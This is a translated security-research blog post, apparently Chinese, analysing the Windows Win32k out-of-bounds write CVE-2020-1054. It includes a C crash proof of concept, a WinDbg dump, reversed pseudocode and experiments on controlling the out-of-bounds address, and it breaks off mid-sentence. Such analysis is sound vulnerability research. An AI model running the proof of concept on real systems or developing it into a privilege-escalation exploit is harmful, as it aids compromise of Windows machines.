# CVE-2020-1054分析
|
##### 译文声明
本文是翻译文章，文章原作者 0xeb-bp，文章来源：0xeb-bp.github.io
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
该文章对今年5月微软发布的安全漏洞CVE-2020-1054进行分析分析。漏洞存在于Win32k内核模块中，利用该漏洞最终会造成权限提升。该漏洞由Check
Point Research的Netanel Ben-Simon和Yoav Alon以及奇虎360 Vulcan
Team的bee13oy报告。他们在今年的OffensiveCon20会议上发表了名为 [Bugs on the Windshield: Fuzzing
the Windows Kernel](https://research.checkpoint.com/2020/bugs-on-the-windshield-fuzzing-the-windows-kernel/) 的演讲。在演讲中详细介绍了他们找到这个bug的过程。
## 产生的崩溃
Netanel和Yoav提供了[崩溃代码](https://cpr-zero.checkpoint.com/vulns/cprid-2153/)。
通过这段代码能够直接找到产生崩溃的关键位置，不再需要通过BinDiff进行补丁比对。
    int main(int argc, char *argv[])
    {
        LoadLibrary("user32.dll");
        HDC r0 = CreateCompatibleDC(0x0);
        // CPR's original crash code called CreateCompatibleBitmap as follows
        // HBITMAP r1 = CreateCompatibleBitmap(r0, 0x9f42, 0xa);
        // however all following calculations/reversing in this blog will 
        // generally use the below call, unless stated otherwise
        // this only matters if you happen to be following along with WinDbg
        HBITMAP r1 = CreateCompatibleBitmap(r0, 0x51500, 0x100);
        SelectObject(r0, r1);
        DrawIconEx(r0, 0x0, 0x0, 0x30000010003, 0x0, 0xfffffffffebffffc, 
            0x0, 0x0, 0x6);
        return 0;
    }
代码中相关的函数
`CreateCompatibleBitmap`和`DrawIconEx`的参数、用法及返回值内容可以在[微软官方文档](https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-createcompatiblebitmap)上查到。
我的第一步是在Rust中重写代码并在Windows 7 x64机器上运行它，并在Windbg得到了崩溃时的Context。
    PAGE_FAULT_IN_NONPAGED_AREA (50)
    Invalid system memory was referenced.  This cannot be protected by try-except.
    Typically the address is just plain bad or it is pointing at freed memory.
    Arguments:
    Arg1: fffff904c7000240, memory referenced.
    Arg2: 0000000000000000, value 0 = read operation, 1 = write operation.
    Arg3: fffff960000a5482, If non-zero, the instruction address which referenced 
        the bad memory address.
    Arg4: 0000000000000005, (reserved)
    Some register values may be zeroed or incorrect.
    rax=fffff900c7000000 rbx=0000000000000000 rcx=fffff904c7000240
    rdx=fffff90169dd8f80 rsi=0000000000000000 rdi=0000000000000000
    rip=fffff960000a5482 rsp=fffff880028f3be0 rbp=0000000000000000
     r8=00000000000008f0  r9=fffff96000000000 r10=fffff880028f3c40
    r11=000000000000000b r12=0000000000000000 r13=0000000000000000
    r14=0000000000000000 r15=0000000000000000
    iopl=0         nv up ei ng nz na po cy
    win32k!vStrWrite01+0x36a:
    fffff960`000d5482 418b36   mov esi,dword ptr [r14] ds:00000000`00000000=????????
    STACK_TEXT:  
    nt!RtlpBreakWithStatusInstruction
    nt!KiBugCheckDebugBreak+0x12
    nt!KeBugCheck2+0x722
    nt!KeBugCheckEx+0x104
    nt!MmAccessFault+0x736
    nt!KiPageFault+0x35c
    win32k!vStrWrite01+0x36a
    win32k!EngStretchBltNew+0x171f
    win32k!EngStretchBlt+0x800
    win32k!EngStretchBltROP+0x64b
    win32k!BLTRECORD::bStretch+0x642
    win32k!GreStretchBltInternal+0xa43
    win32k!BltIcon+0x18f
    win32k!DrawIconEx+0x3b7
    win32k!NtUserDrawIconEx+0x14d
    nt!KiSystemServiceCopyEnd+0x13
    USER32!ZwUserDrawIconEx+0xa
    USER32!DrawIconEx+0xd9
    cve_2020_1054!CACHED_POW10  (cve_2020_1054+0x106d)
崩溃时的 `rip` 指向的指令是 `mov esi,dword ptr [r14]` 这条指令在win32k当中
`win32k!vStrWrite01+0x36a` 在这个位置设置一个断点，能够得到下面的结果。
很明显，崩溃是由于无效的内存引用而发生的，这和windbg中显示的漏洞类型一样。
CheckPoint网站上对这个漏洞的描述是它是一个越界（OOB）写入漏洞。
假设崩溃时访问的地址 `0xffff904'c7000240`
是能够通过OOB控制其中内容的。这里需要注意的是，下面的文章中使用的地址均为`0xffff904'c7000240`
，这个值在每次程序执行的过程中都会更改。
## 控制越界访问
我们的第一个目标是了解如何控制地址 `fffff904'c7000240` ，该地址将称为oob_target。
为此，需要对vStrWrite01的相关代码进行逆向分析。 从 `mov esi，dword ptr [r14]` 指令开始
通过 `lea r14, [rcx + rax*4]` 设置 `r14` 寄存器
接着 `rcx` 寄存器在 `vStrWrite01` 函数的地一个基本块当中被初始化，然后在下面的循环中继续处理
`rcx` 寄存器在循环中会一直加上一个常数值，通过汇编指令 `add ecx, eax` 实现，对应伪代码如下:
    var_64h = 0x7fffffff; 
    var_6ch = 0x80000000;
    while ( r11d )
    {
        --r11d;
        if ( ebp >= var_6ch && ebp  dd rcx L2
    fffff900`c4c76eb0  fff2aaab 0006aaab
`fff2aaab` 这个数字有些特别，并且我们感觉到了这个数字和 `DrawIconEx` 函数的第五个参数有关。我们将 `DrawIconEx`
函数的参数修改成 `febffffd`
得到下面的结果
    win32k!vStrWrite01:
    fffff960`00165118 4885d2          test    rdx,rdx
    kd> dd rcx L2
    fffff900`c2962eb0  fff2aaac 0006aaaa
结果变成了 `fff2aaac` 这个结果表明它确实和第五个参数有关。我们继续对这个参数进行实验，修改 `arg5` 并且观察最后得到的
`oob_target` 的结果
我们发现当 `arg5` 为 `ff000000` 的时候，会修改 `oob_target` 的结果，崩溃在了不同的地方
    win32k!vStrWrite01+0x31d:
    fffff960`00165435 3b6c246c        cmp     ebp,dword ptr [rsp+6Ch]
    kd> dq rcx
    fffff903`c7000240  ????????`???????? ????????`????????
如果修改 `arg5` 为 `fd00000` 崩溃的结果又有了些许不同
    win32k!vStrWrite01+0x31d:
    fffff960`00165435 3b6c246c        cmp     ebp,dword ptr [rsp+6Ch]